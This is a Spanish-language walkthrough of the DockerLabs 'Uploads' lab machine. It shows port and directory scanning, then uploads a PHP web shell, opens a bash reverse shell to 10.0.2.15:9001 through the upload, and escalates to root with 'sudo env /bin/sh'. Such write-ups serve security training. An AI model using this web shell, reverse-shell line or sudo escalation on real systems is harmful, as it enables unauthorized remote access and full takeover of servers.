#Uploads DockerLabs
#web - https://dockerlabs.es/#/

Primero hacemos un escaneo de puertos basico hacia la ip que por defecto es la *172.17.0.2*.

```shell
└─$ nmap -sV -sC -n -p- --min-rate 5000 172.17.0.2
===============================================================
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 00:09 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

```

Vemos que hay un puerto 80 abierto y entramos desde firefox.


Entramos y vemos una pagina web con un apartado para subir archivos.
Realizamos un escaneo de subdominios con gobuster para ver si encontramos algo interesante.

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]

```

Encontramos un subdominio *http://172.17.0.2/uploads/*.
Entramos y podemos ver que es donde se alojan los archivos subidos.


Creamos un script en formato ".php" con el siguiente contenido
```shell
<?php
	system($_GET['cmd']);
?>
```

Lo subimos y llamamos al archivo con un "?cmd=id" quedando de esta manera:



```shell
http://172.17.0.2/uploads/cmd.php?cmd=id
```
Entramos a "https://www.revshells.com/" en esta web encontramos revershells ya generadas y listas para copiar y para cambiar los parametros de una manera sencilla



Ejecutamos netcat con el puento 9001 como puerto de escucha
```shell
nc -lvnp 9001
listening on [any] 9001 ...

```

Ejecutamos la reverse shell de manera en que llamemos al archivo "cmd.php" y le pasasemos los parametros anteriores "?cmd=id" y ahora sustituimos id por bash -c seguido de dos comillas y la reverse shell:
```shell
http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )

```
Ahora solo faltaria la escalada de privilegios
Comprobamos los permisos del usuario con:
```shell
sudo -l
```
En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario root como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:
```shell
sudo env /bin/sh
```
y ahora realizamos un whoami para saber que usuario somos:
```shell
whoami
```
y podremos comprobar que si que somos el usuario root.
